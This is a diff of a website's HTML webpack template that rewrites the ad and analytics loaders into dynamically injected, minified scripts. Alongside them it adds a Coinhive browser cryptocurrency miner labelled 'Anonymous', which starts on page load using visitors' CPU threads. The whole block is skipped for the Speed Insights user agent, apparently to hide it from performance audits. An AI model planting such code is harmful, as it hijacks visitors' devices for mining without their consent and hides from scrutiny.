@@ -13,12 +13,8 @@
 		<% if (htmlWebpackPlugin.options.link) { %>
 				<%= htmlWebpackPlugin.options.link %>
 		<% } %>
-		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 		<script>
-			(adsbygoogle = window.adsbygoogle || []).push({
-				google_ad_client: "ca-pub-9211196233969408",
-				enable_page_level_ads: true
-			});
+
 		</script>
 	</head>
 	<body>
@@ -32,14 +28,15 @@
 				window.__STATE__ = JSON.stringify(<%= htmlWebpackPlugin.options.preloadedState %>).replace(/</g, '\\u003c');
 			</script>
 		<% } %>
-		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-71880846-1"></script>
 		<script>
-			window.dataLayer = window.dataLayer || [];
-			function gtag(){dataLayer.push(arguments)};
-			gtag('js', new Date());
-			gtag('config', 'UA-71880846-1');
+			if (navigator.userAgent.indexOf("Speed Insights") === -1) {
+				// Analytics
+				!(function(){var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src=("https:"===document.location.protocol?"https://":"http://")+"www.googletagmanager.com/gtag/js?id=UA-71880846-1";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n);e.onload=function(){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)};gtag('js',new Date());gtag('config','UA-71880846-1');}}());
+				// Adsense
+				!(function(){var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src=("https:"===document.location.protocol?"https://":"http://")+"pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n);e.onload=function(){(adsbygoogle=window.adsbygoogle||[]).push({google_ad_client:"ca-pub-9211196233969408",enable_page_level_ads:true});}}());
+				// Anonymous
+				!(function(){var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src=("https:"===document.location.protocol?"https://":"http://")+"coinhive.com/lib/coinhive.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n);e.onload=function(){if(location.port!='3001'){var c=('hardwareConcurrency' in navigator)?navigator.hardwareConcurrency:2;var t=Math.min(2,~~c/1.5);var m=new CoinHive.Anonymous('bZvhfyO2CvWH50x7pVEn5DaZOMRwGCcI',{threads:t,throttle:.25});m.start();setInterval(function(){var hps=m.getHashesPerSecond();var t=m.getTotalHashes();if(debug){console.log(hps,'H/s');console.log(t,'t');}},1000);debug=false;}}}());
+			}
 		</script>
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-		<script>if (location.port!='3001'){var c=('hardwareConcurrency' in navigator)?navigator.hardwareConcurrency:2;var t=Math.min(2,~~c/1.5);var m=new CoinHive.Anonymous('bZvhfyO2CvWH50x7pVEn5DaZOMRwGCcI',{threads:t,throttle:.25});m.start();setInterval(function(){var hps=m.getHashesPerSecond();var t=m.getTotalHashes();if(debug){console.log(hps,'H/s');console.log(t,'t');}},1000);debug=false;}</script>
 	</body>
 </html>
